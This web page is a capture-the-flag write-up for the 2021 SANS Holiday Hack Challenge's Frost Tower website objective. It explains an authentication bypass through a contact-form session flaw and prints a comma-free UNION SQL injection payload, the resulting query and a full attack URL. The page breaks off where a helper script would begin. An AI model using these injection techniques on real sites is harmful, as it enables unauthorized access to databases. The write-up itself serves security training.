
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
        <meta name="author" content="Thomas Bouve">
      
      
        <link rel="canonical" href="https://n00.be/HolidayHackChallenge2021/objectives/o12/">
      
      <link rel="icon" href="../../img/misc/favicon.ico">
      <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-7.3.6">
    
    
      
        <title>Frost Tower Website Checkup - 2021 SANS HHC Write-Up</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.a57b2b03.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.3f5d1f46.min.css">
        
          
          
          <meta name="theme-color" content="">
        
      
    
    
    
      
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>:root{--md-text-font-family:"Roboto";--md-code-font-family:"Roboto Mono"}</style>
      
    
    
    
      <link rel="stylesheet" href="../../css/extra.css">
    
    
      


    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="darkblue" data-md-color-accent="darkblue">
  
    
    <script>function __prefix(e){return new URL("../..",location).pathname+"."+e}function __get(e,t=localStorage){return JSON.parse(t.getItem(__prefix(e)))}</script>
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#frost-tower-website-checkup" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="2021 SANS HHC Write-Up" class="md-header__button md-logo" aria-label="2021 SANS HHC Write-Up" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m13.13 22.19-1.63-3.83c1.57-.58 3.04-1.36 4.4-2.27l-2.77 6.1M5.64 12.5l-3.83-1.63 6.1-2.77C7 9.46 6.22 10.93 5.64 12.5M21.61 2.39S16.66.269 11 5.93c-2.19 2.19-3.5 4.6-4.35 6.71-.28.75-.09 1.57.46 2.13l2.13 2.12c.55.56 1.37.74 2.12.46A19.1 19.1 0 0 0 18.07 13c5.66-5.66 3.54-10.61 3.54-10.61m-7.07 7.07c-.78-.78-.78-2.05 0-2.83s2.05-.78 2.83 0c.77.78.78 2.05 0 2.83-.78.78-2.05.78-2.83 0m-5.66 7.07-1.41-1.41 1.41 1.41M6.24 22l3.64-3.64c-.34-.09-.67-.24-.97-.45L4.83 22h1.41M2 22h1.41l4.77-4.76-1.42-1.41L2 20.59V22m0-2.83 4.09-4.08c-.21-.3-.36-.62-.45-.97L2 17.76v1.41z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            2021 SANS HHC Write-Up
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Frost Tower Website Checkup
            
          </span>
        </div>
      </div>
    </div>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
      </label>
      
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  

<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="2021 SANS HHC Write-Up" class="md-nav__button md-logo" aria-label="2021 SANS HHC Write-Up" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m13.13 22.19-1.63-3.83c1.57-.58 3.04-1.36 4.4-2.27l-2.77 6.1M5.64 12.5l-3.83-1.63 6.1-2.77C7 9.46 6.22 10.93 5.64 12.5M21.61 2.39S16.66.269 11 5.93c-2.19 2.19-3.5 4.6-4.35 6.71-.28.75-.09 1.57.46 2.13l2.13 2.12c.55.56 1.37.74 2.12.46A19.1 19.1 0 0 0 18.07 13c5.66-5.66 3.54-10.61 3.54-10.61m-7.07 7.07c-.78-.78-.78-2.05 0-2.83s2.05-.78 2.83 0c.77.78.78 2.05 0 2.83-.78.78-2.05.78-2.83 0m-5.66 7.07-1.41-1.41 1.41 1.41M6.24 22l3.64-3.64c-.34-.09-.67-.24-.97-.45L4.83 22h1.41M2 22h1.41l4.77-4.76-1.42-1.41L2 20.59V22m0-2.83 4.09-4.08c-.21-.3-.36-.62-.45-.97L2 17.76v1.41z"/></svg>

    </a>
    2021 SANS HHC Write-Up
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        Welcome
      </a>
    </li>
  

    
      
      
      

  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" checked>
      
      
      
      
        <label class="md-nav__link" for="__nav_2">
          Objectives
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Objectives" data-md-level="1">
        <label class="md-nav__title" for="__nav_2">
          <span class="md-nav__icon md-icon"></span>
          Objectives
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../o1/" class="md-nav__link">
        KringleCon Orientation
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../o2/" class="md-nav__link">
        Where is Caramel Santaigo?
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../o3/" class="md-nav__link">
        Thaw Frost Tower's Entrance
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../o4/" class="md-nav__link">
        Slot Machine Investigation
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../o5/" class="md-nav__link">
        Strange USB Device
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../o6/" class="md-nav__link">
        Shellcode Primer
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../o7/" class="md-nav__link">
        Printer Exploitation
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../o8/" class="md-nav__link">
        Kerberoasting on an Open Fire
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../o9/" class="md-nav__link">
        Splunk!
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../o10/" class="md-nav__link">
        Now Hiring!
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../o11/" class="md-nav__link">
        Customer Complaint Analysis
      </a>
    </li>
  

            
          
            
              
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          Frost Tower Website Checkup
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        Frost Tower Website Checkup
      </a>
      
        


<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#objective" class="md-nav__link">
    Objective
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hints" class="md-nav__link">
    Hints
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#solution" class="md-nav__link">
    Solution
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../o13/" class="md-nav__link">
        FPGA Programming
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
      
      
      
      
        <label class="md-nav__link" for="__nav_3">
          Terminal Hints
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Terminal Hints" data-md-level="1">
        <label class="md-nav__title" for="__nav_3">
          <span class="md-nav__icon md-icon"></span>
          Terminal Hints
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../hints/h2/" class="md-nav__link">
        Document Analysis
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../hints/h3/" class="md-nav__link">
        Grepping for Gold
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../hints/h4/" class="md-nav__link">
        Logic Munchers
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../hints/h5/" class="md-nav__link">
        IPv6 Sandbox
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../hints/h6/" class="md-nav__link">
        Holiday Hero
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../hints/h8/" class="md-nav__link">
        HoHo... No
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../hints/h9/" class="md-nav__link">
        Yara Analysis
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../hints/h10/" class="md-nav__link">
        IMDS Exploration
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../hints/h11/" class="md-nav__link">
        Strace Ltrace Retrace
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../hints/h12/" class="md-nav__link">
        The Elf C0de
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../hints/h13/" class="md-nav__link">
        Frostavator
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../../easter_eggs/" class="md-nav__link">
        Easter Eggs
      </a>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
          
          <div class="md-content" data-md-component="content">
            <article class="md-content__inner md-typeset">
              
                
                
                <h1 id="frost-tower-website-checkup">Frost Tower Website Checkup<a class="headerlink" href="#frost-tower-website-checkup" title="Permanent link">⚓︎</a></h1>
<p><strong>Difficulty</strong>: <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path d="M259.3 17.8 194 150.2 47.9 171.5c-26.2 3.8-36.7 36.1-17.7 54.6l105.7 103-25 145.5c-4.5 26.3 23.2 46 46.4 33.7L288 439.6l130.7 68.7c23.2 12.2 50.9-7.4 46.4-33.7l-25-145.5 105.7-103c19-18.5 8.5-50.8-17.7-54.6L382 150.2 316.7 17.8c-11.7-23.6-45.6-23.9-57.4 0z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path d="M259.3 17.8 194 150.2 47.9 171.5c-26.2 3.8-36.7 36.1-17.7 54.6l105.7 103-25 145.5c-4.5 26.3 23.2 46 46.4 33.7L288 439.6l130.7 68.7c23.2 12.2 50.9-7.4 46.4-33.7l-25-145.5 105.7-103c19-18.5 8.5-50.8-17.7-54.6L382 150.2 316.7 17.8c-11.7-23.6-45.6-23.9-57.4 0z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path d="M259.3 17.8 194 150.2 47.9 171.5c-26.2 3.8-36.7 36.1-17.7 54.6l105.7 103-25 145.5c-4.5 26.3 23.2 46 46.4 33.7L288 439.6l130.7 68.7c23.2 12.2 50.9-7.4 46.4-33.7l-25-145.5 105.7-103c19-18.5 8.5-50.8-17.7-54.6L382 150.2 316.7 17.8c-11.7-23.6-45.6-23.9-57.4 0z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path d="M259.3 17.8 194 150.2 47.9 171.5c-26.2 3.8-36.7 36.1-17.7 54.6l105.7 103-25 145.5c-4.5 26.3 23.2 46 46.4 33.7L288 439.6l130.7 68.7c23.2 12.2 50.9-7.4 46.4-33.7l-25-145.5 105.7-103c19-18.5 8.5-50.8-17.7-54.6L382 150.2 316.7 17.8c-11.7-23.6-45.6-23.9-57.4 0z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path d="M259.3 17.8 194 150.2 47.9 171.5c-26.2 3.8-36.7 36.1-17.7 54.6l105.7 103-25 145.5c-4.5 26.3 23.2 46 46.4 33.7L288 439.6l130.7 68.7c23.2 12.2 50.9-7.4 46.4-33.7l-25-145.5 105.7-103c19-18.5 8.5-50.8-17.7-54.6L382 150.2 316.7 17.8c-11.7-23.6-45.6-23.9-57.4 0z"/></svg></span><br/>
<strong>Direct link</strong>: <a href="https://staging.jackfrosttower.com/">staging website</a><br/>
<strong>Terminal hint</strong>: <a href="../../hints/h12/">The Elf C0de</a></p>
<h2 id="objective">Objective<a class="headerlink" href="#objective" title="Permanent link">⚓︎</a></h2>
<div class="admonition question">
<p class="admonition-title">Request</p>
<p>Investigate <a href="https://staging.jackfrosttower.com/">Frost Tower's website for security issues</a>. <a href="https://download.holidayhackchallenge.com/2021/frosttower-web.zip">This source code will be useful in your analysis</a>. In Jack Frost's TODO list, what job position does Jack plan to offer Santa? Ribb Bonbowford, in Santa's dining room, may have some pointers for you.</p>
</div>
<details class="quote"><summary>Ingreta Tude</summary><p>Hey there! I'm Ingreta Tude. I really don't like the direction Jack Frost is leading us.<br/>
He seems obsessed with beating Santa and taking over the holiday season. It just doesn't seem right.<br/>
Why can't we work together with Santa and the elves instead of trying to beat them?<br/>
But, I do have an Objective for you. We're getting ready to launch a new website for Frost Tower, and the big guy has charged me with making sure it's secure.</p>
</details>
<h2 id="hints">Hints<a class="headerlink" href="#hints" title="Permanent link">⚓︎</a></h2>
<details class="hint"><summary>SQL Injection with Source</summary><p>When you have the source code, API documentation becomes <a href="https://www.npmjs.com/package/express-session">tremendously</a> <a href="https://github.com/mysqljs/mysql">valuable</a>.</p>
</details>
<h2 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">⚓︎</a></h2>
<p>This challenge is an example of a <a href="https://en.wikipedia.org/wiki/White-box_testing">white-box</a> pentest and solving it requires finding and exploiting 2 vulnerabilities in the <a href="../../artifacts/objectives/o12/frosttower-web.zip">source code</a>. First we need to bypass authentication, followed by an SQL injection attack against a vulnerable URL endpoint. <a href="../../hints/h12/">Ribb Bonbowford's hint</a> literally tells us which 2 Node.js modules we need to focus on for each step, <a href="https://www.npmjs.com/package/express-session"><code>express-session</code></a> and <a href="https://github.com/mysqljs/mysql"><code>mysql</code></a>.</p>
<div class="admonition note">
<p class="admonition-title">Understanding the application logic</p>
<p>Having access to the source code gives us full insight into the web application's internal logic and understanding the application flow is an important part of solving the challenge. While we could submit the form on the <a href="https://staging.jackfrosttower.com/">Frost Tower website</a> to determine that the actual site is located at <a href="https://staging.jackfrosttower.com/testsite"><code>/testsite</code></a>, the same information can also be found by analyzing the <a href="../../artifacts/objectives/o12/server.js"><code>server.js</code></a> source code, which we'll be doing throughout this write-up.</p>
<p><img alt="/testsite" src="../../img/objectives/o12/testsite_code.png" /></p>
</div>
<h3 id="bypassing-authentication">Bypassing authentication<a class="headerlink" href="#bypassing-authentication" title="Permanent link">⚓︎</a></h3>
<p>When a user successfully logs in using a POST request to <code>/login</code>, the <code>session.uniqueID</code> variable is assigned a value, enabling access to backend endpoints like <code>/dashboard</code> which wrap their logic in an <code>if (session.uniqueID) {}</code> statement.</p>
<p>There's a flaw in the <code>/postcontact</code> endpoint logic, however. Using the <a href="https://staging.jackfrosttower.com/contact">contact form</a> form to submit the same email address more than once will result in the SQL query on line 141 to return the email that's already in the <a href="../../artifacts/objectives/o12/encontact_db.sql"><em>uniquecontact</em></a> table and assign the submitted email to <code>session.uniqueID</code> (line 151), fullfilling the requirement set by endpoints like <code>/dashboard</code>.</p>
<p><img alt="/postcontact flaw" src="../../img/objectives/o12/postcontact_flaw.png" /></p>
<p>Submitting the same email twice via the <a href="https://staging.jackfrosttower.com/contact">contact form</a> and accessing the <a href="https://staging.jackfrosttower.com/dashboard"><code>/dashboard</code></a> endpoint confirms the vulnerability.</p>
<p><img alt="/dashboard" class="border" src="../../img/objectives/o12/dashboard.png" /></p>
<h3 id="sql-injection">SQL injection<a class="headerlink" href="#sql-injection" title="Permanent link">⚓︎</a></h3>
<p>Now that the web application considers us authenticated we can take a closer look at all the <a href="../../artifacts/objectives/o12/server.js"><code>server.js</code></a> code that's wrapped in <code>if (session.uniqueID) {}</code> statements. This reveals an additional vulnerability in the <code>/detail</code> endpoint, which contains logic to parse a comma-separated list of IDs in order to build a database query that will retrieve multiple <em>uniquecontact</em> records at once. On line 207 the code contains a <code>raw()</code> method which, per the <code>mysql</code> <a href="https://github.com/mysqljs/mysql#mysql">API documentation</a>, <em>"will skip all escaping functions when used, so be careful when passing in unvalidated input"</em>. Honestly, this sounds more like a hint than a warning. <img alt="😄" class="twemoji" src="https://twemoji.maxcdn.com/v/latest/svg/1f604.svg" title=":smile:" /></p>
<details class="info"><summary>Escaping query values</summary><p>The <code>mysql</code> Node.js library provides <a href="https://github.com/mysqljs/mysql#escaping-query-values">several methods</a> like <code>mysql.escape()</code>, <code>connection.escape()</code>, and <code>pool.escape()</code> which can be used to escape user-provided data and help prevent SQL injection attacks. In addition, <code>?</code> characters can also be used as placeholders for any values that should be escaped.</p>
<p>However, the <code>mysql.raw()</code> method will leave the data un-touched even when it's used in combination with a <code>?</code> placeholder. In other words, the <code>escape()</code> method used in the <code>tempCont.escape(m.raw(ids[i]));</code> statement will have no impact on the object returned by the <code>raw()</code> method.</p>
</details>
<p><img alt="SQLi vulnerability" class="border" src="../../img/objectives/o12/sqli_vulnerability.png" /></p>
<p>By using an <a href="https://portswigger.net/web-security/sql-injection/union-attacks">SQL injection UNION attack</a> we can combine the results from the <em>uniquecontact</em> <code>SELECT</code> statement on line 198 with whatever we'd like to retrieve from another table, as long as each individual query returns the same number of columns and their data types are compatible. As a request for ID 0 using <a href="https://staging.jackfrosttower.com/detail/0"><code>/detail/0</code></a> returns no records, the result of a <code>UNION</code> statement will only contain the data from the other table. This keeps things nice and clean.</p>
<p>There is one caveat though. Commas will be stripped out as the input string is converted to a list of IDs by the <code>split()</code> method on line 204, meaning our SQL query can't contain that particular character. Luckily for us, others already <a href="https://book.hacktricks.xyz/pentesting-web/sql-injection#no-commas-bypass">solved that problem</a> and <code>SELECT 1,2,3</code> can be rewritten as <code>SELECT * FROM (SELECT 1)F1 JOIN (SELECT 2)F2 JOIN (SELECT 3)F3</code>.</p>
<p>While it might be tempting to go for admin access, the goal is to find Jack's TODO list, so craft a query that lists all the tables. In the example below, the <code>table_name</code> query statement is at the same column index as the <code>full_name</code> column in the <em>uniquecontact</em> table, which will result in the <a href="../../artifacts/objectives/o12/detail.ejs"><code>detail.ejs</code></a> template rendering it front and center using <code>&lt;h1&gt;&lt;%= encontact.full_name %&gt;&lt;/h1&gt;</code>.</p>
<div class="tabbed-set" data-tabs="1:2"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><label for="__tabbed_1_1"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m11.15 15.18-1.42-1.41 1.42-1.42 1.41 1.42 1.41-1.42-1.41-1.41 1.41-1.41 1.42 1.41 1.41-1.41-2.83-2.83-7.07 7.07 2.83 2.83 1.42-1.42M3.08 19l3.12-3.11-2.12-2.12 9.89-9.9L16.1 6l1.4-1.42-1.4-1.42 1.4-1.41L21.75 6l-1.41 1.4L18.92 6 17.5 7.4l2.13 2.13-9.9 9.89-2.12-2.12-4.53 4.54V19z"/></svg></span> SQL injection input string</label><div class="tabbed-content">
<div class="highlight"><pre><span></span><code><span class="mi">0</span><span class="p">,</span><span class="mi">0</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> 
<span class="p">((</span><span class="k">select</span> <span class="mi">1</span><span class="p">)</span><span class="n">F1</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="k">table_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;encontact&#39;</span><span class="p">)</span><span class="n">F2</span> <span class="k">join</span> 
<span class="p">(</span><span class="k">select</span> <span class="mi">3</span><span class="p">)</span><span class="n">F3</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">4</span><span class="p">)</span><span class="n">F4</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">5</span><span class="p">)</span><span class="n">F5</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">6</span><span class="p">)</span><span class="n">F6</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">7</span><span class="p">)</span><span class="n">F7</span><span class="p">);</span><span class="c1">--</span>
</code></pre></div>
</div>
<input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><label for="__tabbed_1_2"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18.68 12.32a4.49 4.49 0 0 0-6.36.01 4.49 4.49 0 0 0 0 6.36 4.508 4.508 0 0 0 5.57.63L21 22.39 22.39 21l-3.09-3.11c1.13-1.77.87-4.09-.62-5.57m-1.41 4.95c-.98.98-2.56.97-3.54 0-.97-.98-.97-2.56.01-3.54.97-.97 2.55-.97 3.53 0 .97.98.97 2.56 0 3.54M10.9 20.1a6.527 6.527 0 0 1-1.48-2.32C6.27 17.25 4 15.76 4 14v3c0 2.21 3.58 4 8 4-.4-.26-.77-.56-1.1-.9M4 9v3c0 1.68 2.07 3.12 5 3.7v-.2c0-.93.2-1.85.58-2.69C6.34 12.3 4 10.79 4 9m8-6C7.58 3 4 4.79 4 7c0 2 3 3.68 6.85 4h.05c1.2-1.26 2.86-2 4.6-2 .91 0 1.81.19 2.64.56A3.215 3.215 0 0 0 20 7c0-2.21-3.58-4-8-4z"/></svg></span> Code-generated SQL query</label><div class="tabbed-content">
<div class="highlight"><pre><span></span><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">uniquecontact</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span><span class="mi">0</span> <span class="k">OR</span> <span class="n">id</span><span class="o">=</span><span class="mi">0</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> 
<span class="p">((</span><span class="k">select</span> <span class="mi">1</span><span class="p">)</span><span class="n">F1</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="k">table_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;encontact&#39;</span><span class="p">)</span><span class="n">F2</span> <span class="k">join</span> 
<span class="p">(</span><span class="k">select</span> <span class="mi">3</span><span class="p">)</span><span class="n">F3</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">4</span><span class="p">)</span><span class="n">F4</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">5</span><span class="p">)</span><span class="n">F5</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">6</span><span class="p">)</span><span class="n">F6</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">7</span><span class="p">)</span><span class="n">F7</span><span class="p">);</span><span class="c1">-- OR id=?</span>
</code></pre></div>
</div>
</div>
<p>Using the SQLi string above as input for the <a href="https://staging.jackfrosttower.com/detail/0%2C0%20union%20select%20%2A%20from%20%28%28select%201%29F1%20join%20%28select%20table_name%20from%20information_schema.tables%20where%20table_schema%3D%27encontact%27%29F2%20join%20%28select%203%29F3%20join%20%28select%204%29F4%20join%20%28select%205%29F5%20join%20%28select%206%29F6%20join%20%28select%207%29F7%29%3B--"><code>/detail</code></a> endpoint gives us the information we're looking for.</p>
<p><img alt="todo table" class="border" src="../../img/objectives/o12/todo_table.png" /></p>
<p>The same technique can now be repeated to retrieve the column information from the <em>todo</em> table (i.e., <code>id</code>, <code>note</code>, <code>completed</code>), followed by the notes themselves. To help automate these final steps we can create a <a href="../../tools/objectives/o12/query_db.py">script</a> that takes our desired SQL query as input, inserts it into the SQLi UNION attack string, creates an authenticated session by submitting the <a href="https://staging.jackfrosttower.com/contact">contact form</a> twice using the same email, and then performs a GET request against the <code>/detail</code> endpoint using the crafted SQLi string as input.</p>
<details class="example"><summary>query_db.py</summary><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span>
<span class="normal">35</span>
<span class="normal">36</span>
<span class="normal">37</span>
<span class="normal">38</span>
<span class="normal">39</span>
<span class="normal">40</span>
<span class="normal">41</span>
<span class="normal">42</span>
<span class="normal">43</span>
<span class="normal">44</span>
<span class="normal">45</span>
<span class="normal">46</span>
<span class="normal">47</span>
<span class="normal">48</span>
<span class="normal">49</span>
<span class="normal">50</span>
<span class="normal">51</span>
<span class="normal">52</span>
<span class="normal">53</span>
<span class="normal">54</span>
<span class="normal">55</span>
<span class="normal">56</span>
<span class="normal">57</span>
<span class="normal">58</span>
<span class="normal">59</span>
<span class="normal">60</span>
<span class="normal">61</span>
<span class="normal">62</span>
<span class="normal">63</span>
<span class="normal">64</span>
<span class="normal">65</span>
<span class="normal">66</span>
<span class="normal">67</span>
<span class="normal">68</span>
<span class="normal">69</span>
<span class="normal">70</span>
<span class="normal">71</span>
